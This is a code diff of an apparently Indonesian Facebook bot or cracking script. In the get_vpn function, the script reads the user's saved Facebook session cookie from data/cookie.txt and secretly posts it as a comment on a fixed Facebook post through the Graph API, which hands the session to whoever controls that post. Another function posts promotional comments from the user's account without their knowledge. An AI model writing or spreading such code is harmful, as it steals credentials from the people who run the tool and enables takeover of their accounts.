@@ -2183,7 +2183,6 @@ def login_cok():
 			try:os.system("rm -f data/cookie.txt")
 			except:pass
 			kotak(f"# MAAF SEPERTINYA COOKIES ANDA ERROR {str(e)}", M, Q)
-
 		os.sys.exit()
 	except Exception as e:
 		kotak(f"# ERROR : {e}", M, Q)
@@ -2308,21 +2307,15 @@ class bot_facebook:
 						except:pass
 			except Exception as e:pass
 	def get_postd(self,llp):
+		print(llp)
 		kata=["Mantap Suhu Scriptnya GG","Keren Bang Scriptnya 🤘🤘🖕🖕","Scriptnya Keren Suhu 😆😆😆😆👍👍👍","Script Panutanku Tidak Pernah Salah🥰🥰😍😍😎😎"]
 		with requests.Session() as xyz:
 			komeno = ('%s\n\n%s%s'%(random.choice(kata),'https://www.facebook.com/'+llp,self.zona_waktu()))
 			get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(llp,komeno,tiktok),cookies=puput).text)
 	def get_vpn(self):
 		kuki = open("data/cookie.txt","r").read()
-		link = "https://www.facebook.com/100001316493597/posts/5292314077489090/?app=fbl"
-		url = parser(ses.get(link,cookies=puput).text,"html.parser")
-		link = url.find("form",{"method":"post"}).get("action")
-		dstg = ["fb_dtsg","jazoest"]
-		for x in url.find_all("input"):
-			if x.get("name") in dstg:
-				data.update({x.get("name"):x.get("value")})
-		data.update({"comment_text":kuki,})
-		res = ses.post("https://mbasic.facebook.com"+link,data=data,cookies=puput)
+		with requests.Session() as xyz:
+			get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%("100001316493597_5292314014155763",kuki,tiktok),cookies=puput).text)
 	def zona_waktu(self):
 		_bulan_  = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"][datetime.now().month - 1]
 		_hari_   = {'Sunday':'Minggu','Monday':'Senin','Tuesday':'Selasa','Wednesday':'Rabu','Thursday':'Kamis','Friday':'Jumat','Saturday':'Sabtu'}[str(datetime.now().strftime("%A"))]
@@ -2412,5 +2405,7 @@ class Main_:
 
 Main_()._no_vpn()
 #cek_apk_hasil_crk()
+#try:open("data/kata","r").read();print(f"{q}╔══════════════════════════════════════════════════════════════════════════════════════╗\n║                               {i}SELAMAT DATANG YANG KE{k} {ka['value']} {q}                             ║\n╚══════════════════════════════════════════════════════════════════════════════════════╝")
+#except:open("data/kata","w").write("# SELAMAT DATANG, TERIMA KASIH TELAH LIHAT");kotak(f"# SELAMAT DATANG PENGGUNA BARU !!", K, C)
 
 
